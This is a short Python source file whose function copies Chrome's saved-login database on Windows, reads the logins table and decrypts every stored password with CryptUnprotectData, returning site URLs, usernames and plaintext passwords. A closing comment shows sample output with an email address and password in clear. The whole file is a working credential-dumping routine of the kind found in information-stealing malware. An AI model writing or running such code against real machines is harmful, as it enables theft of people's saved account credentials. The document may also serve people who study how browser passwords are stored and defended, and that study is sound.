from os import \
    getenv  # To find out the Chrome SQL path which is >> C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data
import sqlite3  # To read the Chrome SQLite DB
import win32crypt  # High level library to call windows API CryptUnprotectData
from shutil import copyfile  # To make a copy of the Chrome SQLite DB


def dumpPass():
    # LOCALAPPDATA is a Windows Environment Variable which points to >>> C:\Users\{username}\AppData\Local
    path = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login Data"
    path2 = getenv("LOCALAPPDATA") + "\Google\Chrome\User Data\Default\Login2"
    copyfile(path, path2)

    conn = sqlite3.connect(path2)  # Connect to the copied Database

    cursor = conn.cursor()  # Create a Cursor object and call its execute() method to perform SQL commands like SELECT
    # SELECT column_name,column_name FROM table_name
    # SELECT action_url and username_value and password_value FROM table logins
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')

    User_Pass = list()
    # To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.
    for raw in cursor.fetchall():
        # print raw[0] + '\n' + raw[1]  # print the action_url (raw[0]) and print the username_value (raw[1])
        password = win32crypt.CryptUnprotectData(raw[2])[
            1]  # pass the encrypted Password to CryptUnprotectData API function to decrypt it
        # print password  # print the password in clear text
        User_Pass.append(raw[0] + ' ' + raw[1] + ' ' + password)
    conn.close()
    return User_Pass

# output
# [u'https://accounts.google.com/signin/v2/challenge/password/empty thanhnx.demo@gmail.com Thanh@123456']
